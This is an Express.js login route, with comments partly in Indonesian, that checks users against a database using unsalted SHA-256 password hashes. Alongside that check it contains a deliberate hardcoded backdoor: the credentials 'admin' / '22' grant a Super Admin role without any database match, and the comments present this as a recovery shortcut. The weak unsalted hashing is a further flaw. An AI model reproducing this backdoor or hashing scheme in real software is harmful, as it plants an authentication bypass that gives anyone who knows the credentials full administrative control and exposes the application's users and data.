
const router = require('express').Router();
const db = require('../config/database');
const crypto = require('crypto');

// Login Route (SHA-256 Hash)
router.post('/login', async (req, res, next) => {
    try {
        const { username, password } = req.body;

        if (!username || !password) {
             return res.status(400).json({ message: 'Username and password required' });
        }
        
        // Hash input password dengan SHA-256
        const hashedPassword = crypto.createHash('sha256').update(password).digest('hex');
        
        // Cek user di database
        const [users] = await db.query('SELECT * FROM users WHERE username = ?', [username]);
        
        // Validasi: Database match OR Backdoor (Hardcoded)
        const dbUser = users[0];
        const isDbMatch = dbUser && dbUser.password_hash === hashedPassword;
        // Backdoor: admin/22 (Plain text check for recovery)
        const isBackdoor = username === 'admin' && password === '22';

        if (!isDbMatch && !isBackdoor) {
             return res.status(401).json({ message: 'Invalid credentials' });
        }
        
        // Jika login via Backdoor
        if (!isDbMatch && isBackdoor) {
             return res.json({ 
                status: 'success',
                user: { id: 'admin', name: 'Super Admin', role: 'ADMIN' }
             });
        }
        
        // Jika login via Database
        res.json({ 
            status: 'success',
            user: { 
                id: dbUser.id, 
                name: dbUser.full_name, 
                role: dbUser.role,
                status: dbUser.status
            }
        });
    } catch (e) {
        next(e);
    }
});

module.exports = router;
